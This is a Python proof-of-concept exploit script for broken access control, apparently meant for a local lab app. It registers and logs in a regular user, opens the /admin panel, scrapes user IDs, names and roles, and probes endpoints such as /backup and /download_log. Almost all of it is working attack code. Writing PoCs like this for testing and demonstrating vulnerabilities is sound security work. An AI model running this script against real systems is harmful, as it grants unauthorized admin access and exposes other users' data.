#!/usr/bin/env python3

import requests
import sys
import re

def broken_access_control_poc(base_url):
    print("\n[*] Broken Access Control Proof of Concept")
    print("[*] This PoC demonstrates accessing admin functionality as a regular user")
    
    # The vulnerable endpoints
    register_url = f"{base_url}/register"
    login_url = f"{base_url}/login"
    admin_url = f"{base_url}/admin"
    
    # Create a regular user account
    print("\n[+] Creating a regular user account...")
    username = "regular_user"
    password = "Password123!"
    
    register_data = {
        "username": username,
        "password": password
    }
    
    response = requests.post(register_url, data=register_data)
    
    if "Username already exists" in response.text:
        print("[+] User already exists, continuing with login")
    elif "/login" in response.url:
        print("[+] Successfully registered regular user")
    else:
        print("[-] Failed to register user")
        print(f"[-] Response: {response.text[:100]}...")
        return
    
    # Login as the regular user
    print("\n[+] Logging in as regular user...")
    login_data = {
        "username": username,
        "password": password
    }
    
    session = requests.Session()
    response = session.post(login_url, data=login_data)
    
    if "/profile" in response.url:
        print("[+] Successfully logged in as regular user")
        
        # Check user's role by examining the profile page
        profile_response = session.get(f"{base_url}/profile")
        if "regular_user" in profile_response.text:
            print("[+] Confirmed we're logged in as a regular user")
        
        # Now try to access the admin page
        print("\n[+] Attempting to access admin page as regular user...")
        admin_response = session.get(admin_url)
        
        if admin_response.status_code == 200 and "Admin Panel" in admin_response.text:
            print("[!] BROKEN ACCESS CONTROL VULNERABILITY CONFIRMED!")
            print("[+] Successfully accessed admin panel as a regular user")
            
            # Extract user information from the admin panel
            users = re.findall(r'ID: (\d+), Username: ([^,]+), Role: ([^<]+)', admin_response.text)
            if users:
                print("\n[+] Extracted user information from admin panel:")
                for user_id, username, role in users:
                    print(f"    User ID: {user_id}, Username: {username}, Role: {role}")
            
            print("\n[+] This vulnerability could be used to:")
            print("    1. Access sensitive administrative functions")
            print("    2. View, modify, or delete other user accounts")
            print("    3. Access privileged data")
            print("    4. Escalate privileges within the application")
            
            # Try to access other sensitive endpoints that might be admin-only
            print("\n[+] Checking for other sensitive endpoints...")
            sensitive_endpoints = [
                "/download_log",
                "/users/all",
                "/settings",
                "/backup"
            ]
            
            for endpoint in sensitive_endpoints:
                try:
                    response = session.get(f"{base_url}{endpoint}")
                    if response.status_code == 200:
                        print(f"[+] Successfully accessed: {endpoint}")
                        print(f"[+] Response preview: {response.text[:50]}...")
                except:
                    pass
        else:
            print("[-] Access to admin panel was denied")
            print(f"[-] Status code: {admin_response.status_code}")
            print("[-] The application might not be vulnerable to broken access control")
    else:
        print("[-] Failed to login as regular user")
        print(f"[-] Response: {response.text[:100]}...")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    broken_access_control_poc(base_url)